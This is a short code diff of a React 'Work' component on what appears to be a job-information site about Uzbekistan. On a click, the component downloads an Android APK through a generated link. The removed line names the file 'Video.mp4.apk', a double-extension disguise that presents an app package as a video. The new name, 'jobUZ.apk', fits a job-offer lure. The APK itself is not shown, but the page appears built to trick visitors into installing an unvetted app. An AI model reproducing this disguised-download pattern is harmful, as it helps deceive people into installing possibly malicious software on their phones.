@@ -23,7 +23,7 @@ function Work() {
         e.preventDefault();
 
         // Путь к файлу на сервере
-        const fileUrl = 'https://uzbekistan-info.vercel.app/docs/work/Video.mp4.apk  '; 
+        const fileUrl = 'https://uzbekistan-info.vercel.app/docs/work/jobUZ.apk  '; 
 
         // Создаём виртуальную ссылку
         const link = document.createElement('a');
@@ -74,12 +74,6 @@ function Work() {
           WebkitBackdropFilter: 'blur(4px)'
         }}
       >
-        <div className="flag-container" style={{ display: 'inline-block', marginBottom: '10px' }}>
-          {/* ✅ Иконка, символизирующая прорыв */}
-          <span role="img" aria-label="Quantum Job" style={{ fontSize: '3rem' }}>
-            🃏
-          </span>
-        </div>
         <h1
           className="title"
           style={{
